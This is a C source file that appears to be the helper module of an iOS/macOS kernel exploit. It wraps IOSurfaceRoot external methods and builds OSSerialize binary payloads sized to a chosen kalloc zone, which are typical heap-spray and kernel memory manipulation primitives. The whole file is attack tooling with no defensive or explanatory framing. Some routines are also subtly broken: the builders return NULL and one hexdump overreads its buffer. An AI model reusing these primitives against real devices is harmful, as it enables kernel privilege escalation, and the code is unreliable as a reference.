#include "utils.h"


uint32_t *prop = 0;
vm_size_t propsize = 0xf000000;

void allocate_properties_buf(void)
{
    vm_address_t addr = 0;
    kern_return_t kr = _kernelrpc_mach_vm_allocate_trap(mach_task_self(),(vm_address_t*)&addr,propsize,1);

    CHECK_MACH_ERR(kr, "allocate_properties_buf");
    prop = addr;
}

void deallocate_properties_buf(void)
{
    kern_return_t kr = _kernelrpc_mach_vm_deallocate_trap(mach_task_self(),(vm_address_t*)prop,propsize);

    CHECK_MACH_ERR(kr, "deallocate_properties_buf");
    prop = NULL;

}

io_connect_t get_surface_client(void)
{
    return iokit_get_connection("IOSurfaceRoot",0);
}


void set_indexed_timestamp(io_connect_t c,uint32_t surface_id,uint64_t index,uint64_t value)
{
        uint64_t args[3] = {0};
        args[0] = surface_id;
        args[1] = index;
        args[2] = value;
        kern_return_t kr = IOConnectCallMethod(c, 33, args,3,
                                               NULL, 0,
                                               NULL, NULL, NULL, NULL);
        CHECK_MACH_ERR(kr, "set_indexed_timestamp");
}


void set_detach_mode_code(io_connect_t c,uint32_t arg1,uint32_t arg2,uint32_t arg3,uint32_t arg4)
{
        uint64_t args[4] = {0};
        args[0] = arg1;
        args[1] = arg2;//index;
        args[2] = arg3;//value;
        args[3] = arg4;//value;
        kern_return_t kr = IOConnectCallMethod(c, 4, args,4,
                                               NULL, 0,
                                               NULL, NULL, NULL, NULL);
        CHECK_MACH_ERR(kr, "set_detach_mode_code");
}

uint32_t lookup_surface_port(io_connect_t surface,mach_port_t sr)
{
        io_connect_t conn = surface;
        kern_return_t kr = KERN_SUCCESS;

        char output[0xdd0] = {0};
        size_t output_cnt = 0xdd0; // lockResult

        kr = IOConnectCallMethod(conn, 34, &sr,1,
                                 NULL,0,
                                 NULL, 0, output, &output_cnt);
        CHECK_MACH_ERR(kr, "create_surface");
        assert(kr == KERN_SUCCESS);

        uint32_t surface_id = *(uint32_t *)(output + 0x18);

        return surface_id;
}

io_connect_t create_surface(io_connect_t surface,uint32_t *surface_id,CFDataRef data)
{
    io_connect_t conn = surface;
    kern_return_t kr = KERN_SUCCESS;

    char output[0xdd0] = {0};
    size_t output_cnt = 0xdd0; // lockResult

    if (surface == 0) {
        conn = get_surface_client();
    }
    if (data == NULL) {
        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0,
                                    &kCFTypeDictionaryKeyCallBacks,
                                    &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), uintcf(0x1000));

        data = IOCFSerialize(dict, 1);
        assert(data);

    }
    kr = IOConnectCallMethod(conn, 0, 0,0,
                 CFDataGetBytePtr(data), CFDataGetLength(data),
                 NULL, NULL, output, &output_cnt);
    CHECK_MACH_ERR(kr, "create_surface");
    assert(kr == KERN_SUCCESS);

    if (surface_id != NULL)
        *surface_id = *(uint32_t *)(output + 0x18);

    return conn;
}

void iosurface_set_value(io_connect_t surface,uint32_t surface_id)
{
    kern_return_t kr = KERN_SUCCESS;
    uint64_t _output = 0;
    size_t output_cnt = 4;

    uint32_t data_len = (uint32_t )propsize;
    uint8_t *data_bytes = (uint8_t *)prop;

    uint8_t *payload = (uint8_t *)data_bytes;

    *(uint64_t *) payload =  surface_id;


    kr = IOConnectCallMethod(surface, 9,
                 NULL,
                 0,
                 payload,
                 data_len,
                 NULL, NULL,
                 &_output, &output_cnt);

    CHECK_MACH_ERR(kr, "iosurface_set_value");
    assert(kr == KERN_SUCCESS);
}

CFDataRef build_surface_payload(uint32_t count,char *data,uint32_t datasize,uint32_t key)
{
    assert(prop != NULL);

    uint32_t * binary = prop + 2; //(uint32_t *)addr + 2;//malloc(bsize);
    memset((char *)prop,0,propsize );

    int cur = 0;
    //uint32_t count = target_kalloc / 8;

    binary[cur++]  = kOSSerializeBinarySignature;
    binary[cur++]  = (kOSSerializeEndCollection| kOSSerializeArray | 2);

    binary[cur++] = (kOSSerializeArray | count);
    // count : how many object we want ?
    for(int i=0; i< count; i++) {
        int end = (i == (count -1))? kOSSerializeEndCollection : 0;
        binary[cur++]  = (end |kOSSerializeData | datasize );
        memcpy((char *)&binary[cur],data,datasize);
        cur +=  (datasize +3)/4;
    }

    binary[cur++]  = (kOSSerializeEndCollection | kOSSerializeSymbol | 5); // key
    binary[cur++]  = key;
    binary[cur++]  = 0;
    return NULL;
}

CFDataRef build_surface_payload_with_string(uint32_t count,char *string,uint32_t stringsize,uint32_t key)
{

    uint32_t * binary = prop + 2;//a place for surface id
    memset((char *)prop,0,propsize);

    int cur = 0;

    binary[cur++]  = kOSSerializeBinarySignature;
    binary[cur++]  = (kOSSerializeEndCollection| kOSSerializeArray | 2);

    binary[cur++] = (kOSSerializeArray | count);
    // count : how many object we want ?
    for(int i=0; i< count; i++) {
        int end = (i == (count -1))? kOSSerializeEndCollection : 0;
        binary[cur++]  = (end |kOSSerializeString | stringsize -1 );
        memcpy((char *)&binary[cur],string,stringsize);
        cur +=  (stringsize +3)/4;
    }

    binary[cur++]  = (kOSSerializeEndCollection | kOSSerializeSymbol | 5); // key
    binary[cur++]  = key;
    binary[cur++]  = 0;
    return NULL;
}


void iosurface_get_value(io_connect_t surface,void *input,uint32_t inputSize,void *output,size_t *outputSize)
{
    kern_return_t kr = KERN_SUCCESS;
    kr = IOConnectCallMethod(surface, 10,
                 NULL,
                 0,
                 input,
                 inputSize,
                 NULL, NULL,
                 output, &outputSize);
    CHECK_MACH_ERR(kr, "iosurface_get_value");
}

void iosurface_remove_value(io_connect_t surface,CFDataRef data,uint32_t surface_id)
{

    kern_return_t kr = KERN_SUCCESS;
    uint64_t _output = 0;
    size_t output_cnt = 4;
    uint32_t data_len = 0;
    uint8_t *data_bytes = NULL;
    uint8_t *payload = NULL;

    if (data == NULL) {
        data_len = 9;
        payload = malloc(data_len);
        assert(payload);
        memset(payload,0,data_len);
        *(uint64_t *) payload = surface_id;

    } else {

        data_len = CFDataGetLength(data) + 8;
        data_bytes = (uint8_t *)CFDataGetBytePtr(data);

        payload = malloc(data_len);
        assert(payload);

        *(uint64_t *) payload =  surface_id;
        memcpy(payload + 8, data_bytes, data_len - 8);
        hexdump(payload,data_len+8);
    }
    kr = IOConnectCallMethod(surface, 11,
                 NULL,
                 0,
                 payload,
                 data_len,
                 NULL, NULL,
                 &_output, &output_cnt);

    free(payload);
    assert(kr == KERN_SUCCESS);
}


void get_graphics_comm_page_address(io_connect_t surface,uint64_t *out)
{
        kern_return_t kr = KERN_SUCCESS;
        uint32_t outsize = 1;
        kr = IOConnectCallMethod(surface, 32,
                                 NULL,
                                 0,
                                 NULL,
                                 0,
                                 out, &outsize,
                                 NULL,NULL);
        CHECK_MACH_ERR(kr, "get_graphics_comm_page_address");
        return;
}

void iosurface_create_port(io_connect_t surface,uint32_t surface_id,mach_port_t  *port_name)
{
        kern_return_t kr = KERN_SUCCESS;
        uint32_t outsize = 1;
        uint64_t s[2] = {surface_id,0};
        uint64_t out = 0;
        kr = IOConnectCallMethod(surface, 35,
                                 s,
                                 1,
                                 NULL,
                                 0,
                                 &out, &outsize,
                                 NULL,NULL);
        CHECK_MACH_ERR(kr, "iosurface_get_property");
        *port_name = (mach_port_t)out;
        return;
}

void iosurface_get_property(io_connect_t surface,uint32_t surface_id,uint32_t key,void *output,size_t *outputSize)
{

    kern_return_t kr = KERN_SUCCESS;
    uint64_t payload[2];
    payload[0] = surface_id;
    payload[1] = key;

    kr = IOConnectCallMethod(surface, 10,
                 NULL,
                 0,
                 payload,
                 0x10,
                 NULL, NULL,
                 output, outputSize);

    CHECK_MACH_ERR(kr, "iosurface_get_property");
    //assert(kr == KERN_SUCCESS);
}

void iosurface_remove_property(io_connect_t surface,uint32_t surface_id,uint32_t key)
{

    kern_return_t kr = KERN_SUCCESS;
    uint64_t _output = 0;
    size_t output_cnt = 4;

    uint64_t payload[2];
    payload[0] = surface_id;
    payload[1] = key;

    kr = IOConnectCallMethod(surface, 11,
                 NULL,
                 0,
                 payload,
                 0x10,
                 NULL, NULL,
                 &_output, &output_cnt);

    assert(kr == KERN_SUCCESS);
}
